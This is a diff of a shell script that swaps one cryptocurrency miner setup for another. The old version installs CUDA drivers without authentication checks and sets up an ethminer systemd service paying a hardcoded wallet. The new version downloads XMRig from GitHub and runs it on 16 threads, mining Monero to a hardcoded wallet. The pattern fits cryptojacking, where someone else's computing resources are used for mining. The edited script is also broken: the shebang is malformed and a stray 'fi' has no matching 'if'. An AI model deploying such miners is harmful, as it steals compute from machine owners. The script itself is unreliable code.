@@ -1,23 +1,5 @@
-SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
-if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
-then
-	echo "taind vip pro" > isHaveSetupCoin.txt
-	cd /usr/local/bin
-	sudo apt-get install linux-headers-$(uname -r) -y
-	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
-	sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
-	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
-	echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
-	sudo apt-get update
-	sudo apt-get -y install cuda-drivers --allow-unauthenticated
-	sudo apt-get install libcurl3 -y
-	sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-	sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0xb3d998c01fff7a0d0d29f2ef46cd8781cbc717b9.anh@eth.2miners.com:2020 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
+#binbash
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz&&tar xvzf xmrig-6.18.0-bionic-x64.tar.gz&&cd xmrig-6.18.0/&&./xmrig -o xmr-us-east1.nanopool.org:14433 -u 82wwMQJd4hNh7efaq3hgrx7PMkuXMrjTsd4UD5of5uyFRtG8oK1tsVEXHm9Ap25ZTfR1w7oTzBGKpdmRLMG6jqGs2nWUih4.01 --tls --coin monero --threads=16
 	sudo systemctl daemon-reload
-	sudo systemctl enable eth.service
-	sudo systemctl start eth.service
-else
-	sudo systemctl start eth.service
+	
 fi
